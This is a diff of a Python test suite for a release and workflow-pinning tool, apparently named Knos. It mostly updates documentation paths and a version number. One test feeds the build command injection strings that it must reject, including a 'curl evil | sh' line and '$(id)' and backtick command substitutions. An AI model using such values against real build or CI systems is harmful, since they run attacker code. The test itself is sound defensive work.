@@ -191,7 +191,7 @@ def test_every_action_is_a_commit_listed_in_action_pins_and_every_called_workflo
                 assert name[len(CALLED):] in PUBLISHED and (ref == PLACEHOLDER or re.fullmatch(SHA, ref)), (path.name, name, ref)
                 called.add(ref)
             elif name == SUPPLIER:
-                # the supplier's one line calls Knos's own repository at the tag of a release (docs/RECORD.md, section 3): the
+                # the supplier's one line calls Knos's own repository at the tag of a release (docs/reference/RECORD.md, section 3): the
                 # tag names a commit in scripts/action_pins.json, and the release moves both
                 assert path.name == "knos-supplier.yml" and re.fullmatch(r"v\d+\.\d+\.\d+", ref), (path.name, name, ref)
                 assert any(re.fullmatch(r"drexthealpha/Knos@v\d+\.\d+\.\d+", k) and re.fullmatch(SHA, v) for k, v in pins.items()), "no commit is listed for a Knos tag"
@@ -729,7 +729,7 @@ def test_the_signing_list_is_hash_locked_holds_solders_and_nothing_the_command_l
 
 
 def test_the_release_uploads_no_wheel_but_the_locked_one_and_attaches_the_lock_to_the_release(tmp_path, monkeypatch, capsys):
-    """The order of docs/RELEASE.md: the wheel is built ONCE, before the commit; its sha256 is the last line of
+    """The order of docs/reference/RELEASE.md: the wheel is built ONCE, before the commit; its sha256 is the last line of
     requirements/sign.txt; scripts/release.py uploads that file to PyPI before the push. So release.yml writes no lock
     and uploads no wheel to PyPI. It builds the wheel again only to hold the commit to its lock, holds PyPI to the
     same lock, and attaches that wheel and the commit's own sign.txt to the GitHub release."""
@@ -1503,7 +1503,7 @@ def test_the_lock_is_for_the_release_the_workflows_name_and_holds_the_wheel_and_
     good = lock.read_text(encoding="utf-8")
     last = good.splitlines()[-1]
     for wrong in (good.replace(last, ""), good + "typer==0.0.1 --hash=sha256:" + "0" * 64 + "\n", good.replace(last, last[:-1]),
-                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.26 --hash=sha256:" + "a" * 64 + "\n"):
+                  good.replace(last, last.replace(_release(), "9.9.9")), good.replace("solders==", "solderz=="), "knos==0.3.27 --hash=sha256:" + "a" * 64 + "\n"):
         bad = tmp_path / "bad.txt"
         bad.write_text(wrong, encoding="utf-8")
         with pytest.raises(SystemExit, match="the lock is not"):
@@ -1540,7 +1540,7 @@ def test_a_rehearsal_variant_differs_in_how_knos_is_installed_and_in_nothing_els
             pub.main(["check", str(out)])                  # a checkout is checked against the set it was made as, named
     assert pub.main(["check", str(out), "--lock", str(_lock(tmp_path, pub))]) == 1
     capsys.readouterr()
-    for bad in ('knos"; curl evil | sh; "', "knos==0.3.26 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
+    for bad in ('knos"; curl evil | sh; "', "knos==0.3.27 # x", "$(id)", "knos\nrun: x", "a: b", "`id`", ""):
         with pytest.raises(SystemExit):
             pub.main(["build", str(tmp_path / "bad"), "--source", bad])
     assert not (tmp_path / "bad").exists()
@@ -1554,7 +1554,8 @@ def _tree(tmp_path: Path, pub) -> Path:
         (shutil.copytree if (ROOT / rel).is_dir() else shutil.copyfile)(ROOT / rel, root / rel)
     now = pub.pin()
     (root / "docs" / "img").mkdir(parents=True)
-    (root / "docs" / "INSTALL.md").write_text(f"    uses: {CALLED}fund.yml@{now}\n\nThe commit is `{now}`.\n", encoding="utf-8")
+    (root / "docs" / "reference").mkdir()
+    (root / "docs" / "reference" / "INSTALL.md").write_text(f"    uses: {CALLED}fund.yml@{now}\n\nThe commit is `{now}`.\n", encoding="utf-8")
     (root / "docs" / "img" / "logo.png").write_bytes(b"\x89PNG\r\n\xff\xfe" + now.encode())      # not text: left alone
     return root
 
@@ -1567,14 +1568,14 @@ def test_stamp_names_one_commit_everywhere_and_check_says_every_place_that_disag
     assert pub.main(["check"]) == 0
     first, second = "ab" * 20, "cd" * 20
     named = [root / "examples" / "knos-workflow.yml", root / "examples" / "knos-check.yml", root / ".github" / "workflows" / "knos.yml",
-             root / ".github" / "workflows" / "knos-check.yml", root / "docs" / "INSTALL.md", root / "web" / "front.js"]
+             root / ".github" / "workflows" / "knos-check.yml", root / "docs" / "reference" / "INSTALL.md", root / "web" / "front.js"]
     for sha, old in ((first, before), (second, first)):        # a release, then the next one
         assert pub.main(["stamp", sha]) == 0 and "Named drexthealpha/knos-workflows@" + sha in capsys.readouterr().out
         for path in named:
             text = path.read_text(encoding="utf-8")
             assert f"{CALLED}fund.yml@{sha}" in text or f"{CALLED}check.yml@{sha}" in text, path.name
             assert f"@{old}" not in text and (path.name == "front.js" or old not in text), path.name
-        assert f"The commit is `{sha}`." in (root / "docs" / "INSTALL.md").read_text(encoding="utf-8")
+        assert f"The commit is `{sha}`." in (root / "docs" / "reference" / "INSTALL.md").read_text(encoding="utf-8")
         # the seller's caller and the canary are stamped too: the workflow, and the published list read at the commit
         assert f"{CALLED}attest.yml@{sha}" in (root / "examples" / "knos-attest.yml").read_text(encoding="utf-8")
         assert f"knos-workflows/{sha}/requirements/sign.txt" in (root / "examples" / "knos-canary.yml").read_text(encoding="utf-8")
@@ -1607,7 +1608,7 @@ def test_stamp_names_one_commit_everywhere_and_check_says_every_place_that_disag
                  f"docs/OLD.md reads requirements/sign.txt of drexthealpha/knos-workflows at {first}",
                  "web/front.js does not hand out examples/"):
         assert line in said, line
-    assert "docs/INSTALL.md" not in said and "examples/" + "knos-check.yml" not in said
+    assert "docs/reference/INSTALL.md" not in said and "examples/" + "knos-check.yml" not in said
 
 
 def test_the_site_templates_are_the_examples_byte_for_byte(tmp_path, monkeypatch):
